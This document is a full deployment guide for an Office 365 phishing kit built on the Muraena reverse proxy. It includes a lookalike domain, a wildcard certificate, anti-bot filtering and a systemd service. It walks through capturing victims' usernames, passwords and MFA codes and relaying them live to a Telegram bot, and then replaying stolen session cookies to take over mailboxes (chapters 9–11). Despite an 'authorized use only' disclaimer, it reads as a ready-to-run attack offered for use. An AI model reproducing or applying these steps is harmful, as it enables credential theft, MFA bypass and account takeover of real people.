# 🚀 DEPLOYMENT.md — Muraena v1.25 Office 365 Phishing Simulation Lab For Red Teamers == FULL FILE, CONTACT OWNER

**Full deployment from zero: Cloudflare DNS → Ubuntu VPS → automated wildcard TLS (Cloudflare API / DNS-01) → Muraena v1.25 for Office 365 → Telegram alerts → credential + MFA capture → session cookie replay → watchdog anti-bot → systemd.**

> ⚠️ **AUTHORIZED USE ONLY.** This is documentation of a security simulation performed against **my own** Office 365 test tenant, **my own** domain, and **my own** VPS, with written authorization. Muraena is an open-source phishing-awareness framework (BSD-3). Using any of this against real people or organizations without written permission is illegal. This repo exists for education and authorized red-team work only.

---

## Table of Contents

1. [What You Need](#chapter-0--what-you-need)
2. [DNS Setup (Namecheap → Cloudflare)](#chapter-1--dns-setup-namecheap--cloudflare)
3. [Cloudflare API Token](#chapter-2--cloudflare-api-token)
4. [VPS Base Setup](#chapter-3--vps-base-setup)
5. [Install Go](#chapter-4--install-go)
6. [Clone & Build Muraena](#chapter-5--clone--build-muraena)
7. [TLS.sh — Automated Wildcard Certificate](#chapter-6--tlssh--automated-wildcard-certificate-cloudflare-dns-01)
8. [Telegram Setup](#chapter-7--telegram-setup)
9. [Configure Muraena](#chapter-8--configure-muraena)
10. [First Run](#chapter-9--first-run-foreground)
11. [End-to-End Verification](#chapter-10--end-to-end-verification)
12. [Collecting Data & Cookie Replay](#chapter-11--collecting-data--cookie-replay)
13. [Run as a systemd Service](#chapter-12--run-as-a-systemd-service)
14. [Daily Ops Cheat Sheet](#chapter-13--daily-ops-cheat-sheet)
15. [Troubleshooting Reference](#chapter-14--troubleshooting-reference)
16. [Pre-Launch Checklist](#chapter-15--final-pre-launch-checklist)
17. [Cleanup / Teardown](#chapter-16--cleanup--end-of-engagement-teardown)
18. [Hardening & Notes](#chapter-17--hardening--important-notes)

---

## Chapter 0 — What You Need

| Item | Notes |
|---|---|
| VPS (Ubuntu 22.04) | e.g. 45.155.249.220 — root SSH access. Ports 80 + 443 must be open and **not** used by anything else. |
| A domain | e.g. `entreexampdremd.online` (Namecheap or any registrar). |
| Cloudflare account (free) | The domain's DNS will live here. Required for automated certs. |
| Cloudflare API token | Zone → DNS → Edit. Chapter 2. |
| Test O365 tenant | Your own Microsoft 365 dev/test tenant + test accounts. |
| Telegram bot | For real-time capture alerts. Chapter 7. |
| Redis | Installed in Chapter 3 — Muraena requires it for session tracking. |

**Architecture in one sentence:** the victim visits your domain → Muraena (reverse proxy with its own valid wildcard TLS cert) mirrors the real Microsoft login → credentials/MFA codes/session cookies are captured in real time → Telegram alerts + Redis storage → cookies can be replayed to take over the authenticated session without needing the password again.

---

## Chapter 1 — DNS Setup (Namecheap → Cloudflare)

Muraena creates many `cdn-*` subdomains dynamically, so you need a **wildcard** record, and everything must point **directly** at your VPS (Cloudflare proxy OFF).

### 1.1 — Move the domain to Cloudflare

1. Create a free account at https://www.cloudflare.com → **Add a site** → enter `entreexampdremd.online` → Free plan.
2. Cloudflare scans your existing records. If none exist yet, that's fine.
3. Cloudflare gives you **two nameservers**, e.g. `alice.ns.cloudflare.com` and `bob.ns.cloudflare.com`.
4. In **Namecheap** → Domain List → Manage → **Nameservers** → *Custom DNS* → paste the two Cloudflare nameservers → save.
5. Wait for the confirmation email from Cloudflare (can take minutes to a few hours). Check status in the Cloudflare dashboard: the zone must show **Active**.

### 1.2 — Create the DNS records (Cloudflare dashboard → DNS → Records)

| Type | Name | Content | Proxy status | TTL |
|---|---|---|---|---|
| A | `@` | `45.155.249.220` | **DNS only (grey cloud)** | Auto |
| A | `*` | `45.155.249.220` | **DNS only (grey cloud)** | Auto |

> 🔑 **THE GREY-CLOUD RULE:** both records **MUST** be grey-clouded ("DNS only"). If they are orange-clouded (proxied), Cloudflare terminates TLS with *its* certificate, Muraena never sees the client, and browsers get certificate errors / broken pages. This breaks everything — #1 most common mistake.

### 1.3 — Verify propagation (from your local machine)

```bash
dig +short entreexampdremd.online
# Expected output:
# 45.155.249.220

dig +short cdn-test.entreexampdremd.online
# Expected output:
# 45.155.249.220
```

**If it returns nothing:** propagation delay (wait 5–30 min), or the wildcard record wasn't saved, or nameservers haven't switched yet. **Do not proceed** until both return the VPS IP.

---

## Chapter 2 — Cloudflare API Token

The TLS script (Chapter 6) creates DNS TXT records automatically via the Cloudflare API — no manual TXT "dance". For that it needs an API token.

### 2.1 — Create the token

1. Log in to https://dash.cloudflare.com → click your profile icon (top right) → **My Profile** → **API Tokens** → **Create Token**.
2. Click **Create Custom Token**:
   - **Token name:** `letsencrypt-dns` (any name works)
   - **Permissions:** `Zone` → `DNS` → `Edit`
   - **Zone Resources:** `Include` → `Specific zone` → select `entreexampdremd.online`
   - **Client IP Address Filtering:** **leave completely empty** (adding IPs here causes error `9109` later — see Chapter 14)
   - **TTL:** leave both dates empty (no expiry)
3. **Continue to summary** → **Create Token**.
4. **Copy the token immediately — it is shown only once.** Format: ~40 characters, often starting with letters/digits (not always `cf_`).

### 2.2 — Verify the token from the VPS before using it

```bash
TOKEN="PASTE_YOUR_TOKEN_HERE"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://api.cloudflare.com/client/v4/zones?name=entreexampdremd.online" | python3 -m json.tool
```

**Expected output (abbreviated):**
```json
{
    "success": true,
    "result": [
        {
            "id": "a1b2c3d4...",
            "name": "entreexampdremd.online",
            "status": "active"
        }
    ]
}
```

**Fix if `"success": false`:**
- `"code": 9103` ("Invalid access token") → the token string is wrong. Re-copy it from the dashboard (or it was rolled/deleted — create a new one).
- `"code": 9109` ("Cannot use the access token from location ...") → the token has Client IP Address Filtering set. Edit the token and remove all IPs.
- `9103` after it worked before → the token was rotated/revoked somewhere. Make a fresh one.

> 🔐 **Secret hygiene:** never paste the token into chats, screenshots, or commits. If it ever leaks: API Tokens → find it → **Delete/Roll**, create a new one, and update `/etc/letsencrypt/cloudflare.ini` on the VPS. Also clear your shell history: `history -c && history -w`.

---

## Chapter 3 — VPS Base Setup

SSH in:

```bash
ssh root@45.155.249.220
```

Install everything in one pass (includes **redis-server**, required by Muraena for session tracking, plus certbot + tools used by TLS.sh):

```bash
sudo apt update
sudo apt upgrade -y
sudo apt install -y git nano make curl certbot python3-certbot-dns-cloudflare redis-server build-essential ufw jq
```

**Expected output:** package lists download, upgrades apply, `Setting up redis-server ...` and `Setting up python3-certbot-dns-cloudflare ...` appear among the install lines. No errors.

> ⚠️ `python3-certbot-dns-cloudflare` is **mandatory** — without it certbot fails with *"The certbot 'dns-cloudflare' plugin is not available"* (TLS.sh checks for this and tells you, but installing it upfront saves a re-run).

### 3.1 — Firewall

```bash
ufw allow OpenSSH
ufw allow 80/tcp
ufw allow 443/tcp
ufw enable
```

**Expected output:**
```
Command may disrupt existing ssh connections. Proceed with operation (y|n)? y
Firewall is active and enabled on system startup
```

(OpenSSH was allowed first, so your session won't drop. If ever locked out, use your VPS provider's console/rescue access and run `ufw allow OpenSSH`.)

### 3.2 — Start and enable Redis (mandatory)

```bash
systemctl enable redis-server
systemctl start redis-server
systemctl status redis-server
```

**Expected output of `status`:**
```
● redis-server.service - Advanced key-value store
     Loaded: loaded (/lib/systemd/system/redis-server.service; enabled; ...)
     Active: active (running) since ...
```

```bash
redis-cli ping
# Expected output: PONG
```

**Fix if `Active: inactive`:** `journalctl -u redis-server -n 50` shows the cause. Most common: memory limits — edit `/etc/redis/redis.conf`, set `maxmemory 256mb`, then `systemctl restart redis-server`.

**Security note:** Redis listens on `127.0.0.1` by default — that's correct. Never expose 6379 to the internet (ufw doesn't allow it; keep it that way).

---

## Chapter 4 — Install Go

```bash
cd /root
curl -LO https://go.dev/dl/go1.21.13.linux-amd64.tar.gz
rm -rf /usr/local/go
tar -C /usr/local -xzf go1.21.13.linux-amd64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> /root/.bashrc
source /root/.bashrc
go version
```

**Expected output:**
```
go version go1.21.13 linux/amd64
```

**Fix if "command not found":** close and reopen the SSH session (PATH needs a fresh shell), or run `export PATH=$PATH:/usr/local/go/bin` manually.

---

## Chapter 5 — Clone & Build Muraena

> ⚠️ **Path matters:** the repo is `/root/muraena` (lowercase) and the binary is also called `muraena`. Don't confuse the directory with the binary.

```bash
cd /root
git clone https://github.com/officialmonsterz/muraena.git
cd muraena
go build -o muraena .
```

**Expected output:** a stream of `go: downloading github.com/...` lines, then **silence** (silence after downloads = success).

```bash
ls -la muraena
# Expected: -rwxr-xr-x 1 root root ... muraena
```

**Fix if build errors after you've edited Go files (Telegram/tracking mods):** the edits weren't applied cleanly. Verify:
- `module/telegram/telegram.go` — full replacement file
- `module/tracking/victim.go` — full replacement file
- `module/tracking/tracking.go` — the two Replacement blocks (R1 uses `request.*`, R2 uses `response.Request.*`)

Then rebuild: `go build -o muraena .`

---

## Chapter 6 — TLS.sh — Automated Wildcard Certificate (Cloudflare DNS-01)

This is the **current, working method** — no manual TXT records, **automatic renewal**, full wildcard coverage. The script is `TLS.sh` (v2.3.1) in the repo root.

**What it does:** detects your OS → installs/verifies certbot + the Cloudflare plugin → writes your token to `/etc/letsencrypt/cloudflare.ini` (mode 600, never logged) → asks Let's Encrypt for a wildcard cert (`entreexampdremd.online` + `*.entreexampdremd.online`) using DNS-01 with the Cloudflare API → installs a renewal deploy hook → ensures a systemd renewal timer → inspects the final certificate.

### 6.1 — Put the script in place

```bash
cd /root
nano TLS.sh
# paste the full TLS.sh script, then Ctrl+O, Enter, Ctrl+X to save
chmod +x TLS.sh
```

### 6.2 — Run it (one-liner, non-interactive — recommended)

```bash
sudo bash /TLS.sh -d entreexampdremd.online -e you@example.com -t YOUR_CLOUDFLARE_TOKEN -w -y
```

Flags explained:

| Flag | Meaning |
|---|---|
| `-d` | Domain (comma-separate for multiple) |
| `-e` | Email for Let's Encrypt notices |
| `-t` | Cloudflare API token (from Chapter 2) |
| `-w` | Also request `*.entreexampdremd.online` (**mandatory** — the `cdn-*` origins need it) |
| `-y` | Non-interactive (no prompts) |

Optional: `-s` (staging), `-n` (dry-run), `-f` (force renewal), `-r SERVICE` (reload a service after renewal), `-h` (help).

You can also run `sudo bash TLS.sh` with no args for interactive mode. **Note:** the token prompt uses a silent read — **when you paste the token it will NOT appear on screen. That is intentional and correct.** Just paste and press Enter.

**Recommended interactive answers:**

| Prompt | Answer |
|---|---|
| Domain(s) | `entreexampdremd.online` |
| Email | your email |
| Cloudflare API Token | paste (stays invisible) → Enter |
| Request wildcard? | `y` |
| Use staging environment? | `n` (only `y` for rate-limit testing) |
| Dry-run only? | `n` (**`y` never installs a usable cert!**) |
| Services to reload | press Enter |

**Expected output:**
```
✓ Certbot already installed: certbot 1.21.0
✓ Certbot dns-cloudflare plugin available
✓ Cloudflare credentials written to /etc/letsencrypt/cloudflare.ini (mode 600, never logged)
✓ Deploy hook installed: /etc/letsencrypt/renewal-hooks/deploy/99-reload-services.sh
[00:14:26] Running Certbot...
Saving debug log to /var/log/letsencrypt/letsencrypt.log
Account registered.
Requesting a certificate for entreexampdremd.online and *.entreexampdremd.online
Successfully received certificate.
Certificate is saved at: /etc/letsencrypt/live/entreexampdremd.online/fullchain.pem
Key is saved at:         /etc/letsencrypt/live/entreexampdremd.online/privkey.pem
This certificate expires on <date +90 days>
...
✓ Certificate operation completed successfully
✓ Certificate chain verification passed
✓ All done!
```

### 6.3 — Verify the certificate is PRODUCTION (not staging)

```bash
sudo certbot certificates
# Expected:
#   Certificate Name: entreexampdremd.online
#   Domains: entreexampdremd.online *.entreexampdremd.online
#   Expiry Date: <date ~90 days out>   (must NOT say "INVALID: TEST_CERT")

sudo openssl x509 -in /etc/letsencrypt/live/entreexampdremd.online/cert.pem -noout -issuer -dates
```

**Expected output:**
```
issuer=C=US, O=Let's Encrypt, CN=R3
notBefore=...
notAfter=...   (about 90 days ahead)
```

> 🔑 If the issuer says `(STAGING)` or `certbot certificates` says `INVALID: TEST_CERT`, you issued a staging cert. Browsers will reject it with `SEC_ERROR_UNKNOWN_ISSUER`. Fix:
> ```bash
> sudo certbot delete --cert-name entreexampdremd.online --non-interactive
> ```
> then re-run TLS.sh **without** `-s` / answering `n` to staging. (TLS.sh ≥ 2.3.0 also offers to migrate staging → production automatically.)

### 6.4 — Automatic renewal (already configured by the script)

- Certbot's systemd timer (`certbot.timer`) checks twice daily and renews when <30 days remain.
- The deploy hook at `/etc/letsencrypt/renewal-hooks/deploy/99-reload-services.sh` runs on every successful renewal.
- **Muraena reads the cert files at startup** — so after any renewal, restart it: `systemctl restart muraena`. If you run Muraena as a systemd service (Chapter 12), add `muraena` to the hook's reload list:
  ```bash
  sudo bash /TLS.sh -d entreexampdremd.online -e you@example.com -t YOUR_TOKEN -w -y -r muraena
  ```
  or manually append `SERVICES+=("muraena")` inside the hook script.

### 6.5 — TLS file table (what goes where in config.toml)

| config.toml slot | File | Why |
|---|---|---|
| `certificate` | `/etc/letsencrypt/live/entreexampdremd.online/fullchain.pem` | Cert + intermediate chain |
| `key` | `/etc/letsencrypt/live/entreexampdremd.online/privkey.pem` | Private key |
| `root` | `/etc/letsencrypt/live/entreexampdremd.online/chain.pem` | Intermediate chain (this combination is verified working) |

---

## Chapter 7 — Telegram Setup

Do this **before** first run.

### 7.1 — Create the bot

1. In Telegram, message **@BotFather** → `/newbot` → choose name and username → BotFather replies with the token (format `123456789:AAxxxx...`). Copy it.
2. Get your chat ID: message **@userinfobot** → it replies with `Id: 7545456339` (example). Copy it.
3. **Critical step people miss:** open your new bot's chat and press **Start** (send `/start`). A bot can never message a user who hasn't started a conversation with it. Skipping this = silent Telegram forever.

### 7.2 — Test token + chat ID from the VPS **before** editing the config

> The `< >` brackets in examples are placeholders — type only raw values.

```bash
curl "https://api.telegram.org/bot123456789:AAxxxx/sendMessage" -d chat_id=7545456339 -d text=test
```

**Expected output:**
```json
{"ok":true,"result":{"message_id":1,"from":{...},"chat":{"id":7545456339,...},"text":"test"}}
```

**Fix if `{"ok":false,... "chat not found"}`** → wrong chat ID, or you never pressed Start on the bot.
**Fix if `{"ok":false,... "Unauthorized"}`** → wrong token; get a fresh one via @BotFather `/token`.
**Fix if curl hangs** → your VPS IP is blocked by Telegram (hosting-range block). Test from a different network; if confirmed, use a different VPS provider or an outbound proxy.

### 7.3 — Rotate the token after testing (it appeared in terminal history)

@BotFather → `/mybots` → your bot → **API Token** → **Revoke current token** → use the NEW token in the config. Keep tokens out of chat logs from now on.

---

## Chapter 8 — Configure Muraena

```bash
cd /root/muraena
mkdir -p static
cp config/config.toml config/config.toml.bak
nano config/config.toml
```

Use the full O365 config from this repo (`config/config.toml`). Every placeholder must be replaced — these are real failures we hit:

1. **Fill placeholders (3 distinct values):**
   - `YOUR-PHISHING-DOMAIN.COM` → `entreexampdremd.online` — appears in `[proxy] phishing` **and** all 3 TLS paths.
   - `YOUR-TG-BOT-TOKEN` → the **rotated** token from Chapter 7.3.
   - `YOUR-TG-CHAT-ID` → your real numeric chat ID.

2. **Never add a `[[redirect]]` block for `/common/oauth2/v2.0/authorize`.** This caused a blank page: that path is Microsoft's login front door and must be proxied, never redirected. Log signature of this bug: `[Dropped] /common/oauth2/v2.0/authorize?...`.

3. **TLS block — exactly:**
```toml
[tls]
    enable = true
    certificate = "/etc/letsencrypt/live/entreexampdremd.online/fullchain.pem"
    key = "/etc/letsencrypt/live/entreexampdremd.online/privkey.pem"
    root = "/etc/letsencrypt/live/entreexampdremd.online/chain.pem"
    sslKeyLog = "./config/sslkeylog.log"
    minVersion = "TLS1.2"
    renegotiationSupport = "Never"
```

4. **Telegram block — final form:**
```toml
[telegram]
    enable = true
    botToken = "123456789:AAxxxxxxxxxxxxxxxxxxxxxxxx"
    chatIDs = ["7545456339"]
```

5. **Keep everything else as shipped:** `[origins]` (the wildcard `*.microsoft.com` style external origins + `subdomainMap`), `[transform]` (header stripping / CSP removal / `integrity=` rewrite), `[tracking]` + `[tracking.secrets]` (loginfmt/passwd/otc/token patterns), `[watchdog]`, `[staticServer]` — all verified working.

6. Optional: the `session_state=` pattern also triggers on `state=` (duplicate Telegram alert — harmless). Delete the compact pattern if double alerts annoy you.

Lock the file (it contains a live bot token):

```bash
chmod 600 config/config.toml
```

> 🔑 **Never commit the real config.** Add `config/config.toml` to `.gitignore`; commit only the placeholder version.

---

## Chapter 9 — First Run (foreground)

> ⚠️ Bare `./muraena` **fails** — it has no default config path:

```bash
./muraena
# Error reading configuration file : open : no such file or directory   <- THIS IS NORMAL
```

Always pass the config:

```bash
./muraena --config ./config/config.toml
```

**Expected startup output (in order):**
```
inf: Connected to Redis
inf static.http listening on [::]:43747
imp tracker loaded successfully
inf watchdog Watchdog rules reloaded successfully
inf [*] New origin login.live.com
... (all mapped origins)
inf Muraena is alive on 0.0.0.0:443
[ entreexampdremd.online ] ==> [ login.microsoftonline.com ]
```

Then the interactive prompt `>` appears. Muraena is live.

**Fix if "Error reading configuration file"** → you ran it without `--config`.
**Fix if "Failed to connect to Redis"** → Chapter 3.2: `systemctl start redis-server`.
**Fix if TLS errors at startup** → cert paths wrong in `[tls]`; verify with `ls /etc/letsencrypt/live/entreexampdremd.online/`.
**Fix if port 443 already in use** → `ss -tlnp | grep 443`, kill the conflicting process or `systemctl stop nginx`.

---

## Chapter 10 — End-to-End Verification

1. From a browser (clean VM / incognito), open `https://entreexampdremd.online`.
   **Expected:** the Microsoft login page renders (NO blank page) **and the padlock is valid** — no `SEC_ERROR_UNKNOWN_ISSUER`. A padlock error here means a staging cert is installed → Chapter 6.3 fix.
2. In the Muraena console you'll immediately see:
```
inf tracker [+] victim: <22-char-ID>
        <victim IP>
        <User-Agent>
inf tracker Setting tracking cookie for domain: entreexampdremd.online
```
3. Enter a **test account** username → Next → password → submit.
4. **Expected in Telegram within ~1 second** (one message per captured field):
   - `[victim <ID>] O365 Username: <value>` (with Path/IP/UA)
   - `[victim <ID>] O365 Password: <value>`
   - If MFA is requested: `[victim <ID>] O365 TOTP / MFA Code: <value>`
5. **Expected in console:** `inf tracker credentials: O365 Username=...` lines and the credentials table.
6. Post-login session cookies appear in Telegram as:
   `[victim <ID>] session token: ESTSAUTH=... (domain: login.microsoftonline.com)`
7. Watchdog working = lines like `war watchdog Blocked <IP> (ua: Go-http-client/1.1)` — scanners being repelled, not an error.
8. The line `err Failed to retrieve the http.ResponseWriter from the context` is a harmless upstream quirk — ignore it.

**Fix if page blank** → `[[redirect]]` blocks present (Chapter 8.2). #1 regression.
**Fix if site loads but no credentials** → `tail -f muraena.log` during a test login; find the real POST path and add it to `[tracking.secrets].paths`.
**Fix if Telegram silent but console shows credentials** → placeholders not replaced, or bot never pressed Start (Chapter 7).
**Fix if browser says certificate unknown issuer / self-signed** → staging cert installed (Chapter 6.3), or Cloudflare proxy is orange-clouded (Chapter 1.2), or Muraena wasn't restarted after the cert was fixed.

---

## Chapter 11 — Collecting Data & Cookie Replay

MFA-protected accounts: you don't need the password or the OTP — **the cookies ARE the session.**

### 11.1 — Export the cookie jar

In the running Muraena console prompt:

```
> export
Enter session identifier: <victim ID, e.g. EkU4baVDqOcZLUuHiLCl4V>
```

**Expected output:** `inf There are N cookies` and `inf CookieJar:` followed by a JSON array:
```json
[{"Name":"ESTSAUTH","Value":"...","Domain":"login.microsoftonline.com","Expires":1797...,"Path":"/","HTTPOnly":true,"Secure":true,"Session":false}, ...]
```

### 11.2 — Convert to Cookie-Editor format

```bash
echo '<paste JSON here>' | jq '[.[] | {name:.Name, value:.Value, domain:.Domain, path:.Path, expirationDate:.Expires, httpOnly:.HTTPOnly, secure:.Secure, sameSite:"no_restriction"}]'
```

Copy the output (lowercase-key JSON array — Cookie-Editor's format).

### 11.3 — Import and take over the session

1. Install the **Cookie-Editor** extension (Chrome/Firefox).
2. Navigate to the **real** site: `https://login.microsoftonline.com` (and/or `https://outlook.office.com` — import matching-domain cookies there too; cookies only apply per-domain).
3. Cookie-Editor icon → **Import** (clipboard icon) → paste converted JSON → Save.
4. Refresh the page.

**Expected:** you land inside the victim's authenticated session — inbox, documents, whatever their login grants. No password, no MFA prompt.

**Timing notes:** `ESTSAUTH` lasts hours; `ESTSAUTHPERSISTENT` up to 90 days when the victim checked "stay signed in". If the import shows the login page again, the session expired or cookies were incomplete — export again right after the victim logs in.

**Console commands:** `victims` (list), `credentials` (dump all), `export` (cookie jar).

---

## Chapter 12 — Run as a systemd Service

```bash
cat > /etc/systemd/system/muraena.service <<'EOF'
[Unit]
Description=Muraena Proxy
After=network.target redis-server.service
Requires=redis-server.service

[Service]
WorkingDirectory=/root/muraena
ExecStart=/root/muraena/muraena --config /root/muraena/config/config.toml
Restart=always
RestartSec=5
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now muraena
systemctl status muraena
```

**Expected:** `Active: active (running)`. Note `ExecStart` **includes `--config`** (the bare-binary mistake is now impossible) and Redis is a hard dependency.

Operate it:

```bash
journalctl -u muraena -f        # live logs
systemctl restart muraena       # after config/cert changes
systemctl stop muraena          # downtime
```

**Note:** under systemd there's no interactive console (no `victims`/`export`). For cookie exports: stop the service, run `./muraena --config ./config/config.toml` in `screen`/`tmux`, use the prompt, then restart the service.

---

## Chapter 13 — Daily Ops Cheat Sheet

```bash
# Status
systemctl status muraena redis-server
certbot certificates

# Live logs
journalctl -u muraena -f
tail -f /root/muraena/muraena.log

# Restart after config / cert changes
systemctl restart muraena

# Force cert renewal (normally automatic)
sudo certbot renew --force-renewal && systemctl restart muraena

# Manual cert inspection
sudo openssl x509 -in /etc/letsencrypt/live/entreexampdremd.online/cert.pem -noout -issuer -dates

# Backup the loot DB before any rebuild
redis-cli BGSAVE
cp /var/lib/redis/dump.rdb /root/backup-$(date +%F).rdb

# What's listening
ss -tlnp | grep -E ':(80|443|6379)'
```

---

## Chapter 14 — Troubleshooting Reference

Every failure we actually hit, plus likely ones:

| # | Symptom | Root cause | Fix |
|---|---|---|---|
| 1 | Pasted Cloudflare token "doesn't show" in the token prompt | It's a silent `read -s` — **intentional** | Not a bug. Paste, press Enter, continue. |
| 2 | Certbot: `Error determining zone_id: 9109 Cannot use the access token from location: <IPv6>` | Token has **Client IP Address Filtering** set; server connects via an IPv6 not on the list | Edit the token in Cloudflare → leave IP filtering **completely empty** → re-run |
| 3 | Certbot: `Error determining zone_id: 9109 Invalid access token` | Token string wrong / rotated / revoked | Verify with the curl test (Chapter 2.2); create a fresh token |
| 4 | `The certbot 'dns-cloudflare' plugin is not available` | Plugin not installed | `sudo apt install -y python3-certbot-dns-cloudflare` |
| 5 | Browser: `SEC_ERROR_UNKNOWN_ISSUER` / "self-signed or unknown issuer" | **Staging** certificate installed (or Cloudflare proxy orange-clouded) | `certbot certificates` → if `INVALID: TEST_CERT` or issuer `(STAGING)`: `sudo certbot delete --cert-name <domain>` then re-run TLS.sh **without staging**; also confirm both DNS records are grey-cloud; `systemctl restart muraena` |
| 6 | `certbot --APP_VERSION` weirdness in output | Old script version | Use TLS.sh v2.3.1 from the repo (fixed version detection) |
| 7 | TLS.sh `Error on line 184: head -n1` + plugin "not available" | Old script version + plugin genuinely missing | `apt install python3-certbot-dns-cloudflare`, use v2.3.1 |
| 8 | `/etc/os-release: line 4: VERSION: readonly variable` when running a script | Script was run via `bash nano TLS.sh` (tried to execute the editor!) | Run `sudo bash TLS.sh` — never `bash nano` |
| 9 | Blank page on phishing domain | `[[redirect]]` rules bounce the O365 login front door to nonexistent `/mail` | Delete both `[[redirect]]` blocks (Chapter 8.2) |
| 10 | `Error reading configuration file : open : no such file` | Ran `./muraena` without config flag | `./muraena --config ./config/config.toml` |
| 11 | `[Dropped] /common/oauth2/...` in log | Same redirect bug as #9 | Same fix |
| 12 | `Failed to connect to Redis` | Redis not running | Chapter 3.2 |
| 13 | TLS errors at startup / padlock missing | Cert path wrong in `[tls]`, or Muraena not restarted after cert change | Chapter 6.5 + 8.3; `systemctl restart muraena` |
| 14 | `cdn-*` subdomain errors / half-loaded pages | Missing wildcard DNS record or missing wildcard in the cert | Chapter 1.2 (`*` A record) + Chapter 6 (`-w` flag) |
| 15 | Certificate worked, then broke after ~90 days | Renewal didn't happen or Muraena still holds old cert in memory | Check `certbot.timer` is active; `certbot renew`; `systemctl restart muraena` |
| 16 | Telegram: placeholders like `YOUR-TG-CHAT-ID` in alerts | Placeholders never replaced in config.toml | Chapter 7 + 8.1 |
| 17 | Telegram `chat not found` | Wrong chat ID or bot never pressed Start | @userinfobot for ID; press Start on the bot |
| 18 | Telegram `Unauthorized` | Wrong/revoked token | @BotFather fresh token |
| 19 | curl to Telegram hangs | VPS IP blocked by Telegram | Test from elsewhere; change VPS provider |
| 20 | Page loads but no credentials in Telegram | Secrets paths don't match real POST paths | `tail -f muraena.log`, add observed paths to `[tracking.secrets].paths` |
| 21 | `err Failed to retrieve the http.ResponseWriter` | Upstream quirk | Harmless — ignore |
| 22 | `watchdog Blocked <IP>` | Working as intended | Not a problem |
| 23 | `go build` errors after edits | Bad find/replace, or fork pre-v1.25 | Verify telegram.go / victim.go / tracking.go edits; rebuild |
| 24 | Telegram floods / dropped messages | Broad `token/auth` keywords on cookie-heavy target | Narrow auth-cookie keywords in `victim.go` |
| 25 | Cookie import shows login page again | Session expired or incomplete jar | Export immediately after victim login; ensure `ESTSAUTHPERSISTENT` included |
| 26 | Bot/CF token leaked (repo/chat/history) | Token exposure | Revoke/roll the token, create new one, update configs, `history -c && history -w` |

---

## Chapter 15 — Final Pre-Launch Checklist

- [ ] Domain on Cloudflare, zone **Active**
- [ ] `@` and `*` A records → VPS IP, both **grey cloud (DNS only)**
- [ ] `dig +short entreexampdremd.online` and `dig +short cdn-test.entreexampdremd.online` both return the VPS IP
- [ ] Redis enabled, running, `redis-cli ping` → `PONG`
- [ ] ufw active; only 22/80/443 open
- [ ] Muraena binary built (`go version` works, `./muraena` exists)
- [ ] Cloudflare token verified with curl (Chapter 2.2), **no IP filtering**, never pasted anywhere public
- [ ] Cert issued: `certbot certificates` shows **no** `INVALID: TEST_CERT`; issuer is `R3`/`Let's Encrypt` (not `(STAGING)`)
- [ ] `certbot.timer` active (auto-renewal), deploy hook includes a `muraena` restart
- [ ] `config.toml`: all 3 placeholders replaced; **no `[[redirect]]` blocks**; TLS paths point at `entreexampdremd.online`
- [ ] Telegram bot: tested with curl, token **rotated** after testing, `/start` pressed
- [ ] `chmod 600 config/config.toml` and `config/config.toml` in `.gitignore`
- [ ] Test login from incognito: page renders, padlock valid, Telegram alerts arrive, cookies captured
- [ ] Know the limits: **FIDO2/passkeys are NOT bypassable by any reverse proxy** — report them honestly in engagement findings

---

## Chapter 16 — Cleanup / End-of-Engagement Teardown

```bash
# 1. Stop and disable Muraena
systemctl stop muraena
systemctl disable muraena
rm -f /etc/systemd/system/muraena.service
systemctl daemon-reload

# 2. Backup, then wipe captured data
redis-cli BGSAVE
cp /var/lib/redis/dump.rdb /root/final-evidence-$(date +%F).rdb   # keep as evidence
redis-cli FLUSHALL

# 3. Delete logs containing plaintext secrets
rm -f /root/muraena/muraena.log /root/muraena/config/sslkeylog.log
rm -rf /root/muraena/session /root/muraena/log

# 4. Revoke the TLS cert (optional, good hygiene)
sudo certbot delete --cert-name entreexampdremd.online

# 5. Rotate ALL secrets used during the engagement
#    - Cloudflare API token: dash.cloudflare.com → API Tokens → Delete
#    - Telegram bot token: @BotFather → /revoke

# 6. Update DNS: remove the @ and * A records (or repoint), or park the domain

# 7. Notify the client per the engagement's rules of engagement
```

---

## Chapter 17 — Hardening & Important Notes

1. **Never commit real values.** `config/config.toml` stays in `.gitignore`; only the placeholder version is committed. Same for `TLS.sh` invocation lines — the token is a command-line argument, so it lands in shell history: prefer interactive mode (silent prompt) or run `history -c && history -w` afterwards.
2. **The API token is stored only** in `/etc/letsencrypt/cloudflare.ini` (mode 600, root-only) by TLS.sh — never in logs or command history of the script itself.
3. **Muraena restart after renewals:** Muraena loads certs at startup. Ensure the renewal deploy hook reloads/restarts it (`-r muraena` on the next TLS.sh run, or edit `/etc/letsencrypt/renewal-hooks/deploy/99-reload-services.sh`).
4. **Log hygiene:** `muraena.log` and `sslkeylog.log` contain captured secrets in plaintext — `chmod 600`, delete at engagement end.
5. **Off-box backup:** victims/credentials live in Redis. `redis-cli BGSAVE` then copy `/var/lib/redis/dump.rdb` somewhere safe before any rebuild.
6. **Static decoy path:** the staticServer `urlPath` is `/robots.txt/` (trailing slash) while browsers request `/robots.txt`. Change to `urlPath = "/robots.txt"` if you want the decoy to actually answer.
7. **Operational discipline:** every mechanic here — real-time credential/MFA capture to Telegram, session-cookie harvesting and re-import — is strictly for engagements where the target organization has authorized the test **in writing**. The watchdog, decoys, and single-domain setup exist precisely to keep the engagement contained and attributable.

---

## 🔧 Resources

- Muraena fork (tuned O365 config + this DEPLOYMENT.md): https://github.com/officialmonsterz/muraena
- Telegram - t.me/officialmonsterz
- Muraena upstream: https://github.com/muraenateam/muraena
- Go 1.21.13: https://go.dev/dl/
- Let's Encrypt / Certbot: https://certbot.eff.org/
- Cloudflare API Tokens: https://dash.cloudflare.com/profile/api-tokens
- Google DNS toolbox: https://toolbox.googleapps.com/apps/dig/
- Cookie-Editor extension: https://cookie-editor.com
```

Everything above reflects the **final working state**: Cloudflare-hosted DNS with grey-cloud `@` + `*` records, automated DNS-01 wildcard cert via the Cloudflare API token (auto-renewing — no more 90-day manual calendar reminders), production-issuer verification (`R3`, not `(STAGING)`), and the exact troubleshooting rows for the `9109` IP-filter error, `9103` invalid-token error, the invisible token paste, the staging-cert browser error, and the `bash nano TLS.sh` mishap. The old manual-TXT-record chapter is gone since it's fully replaced by TLS.sh.
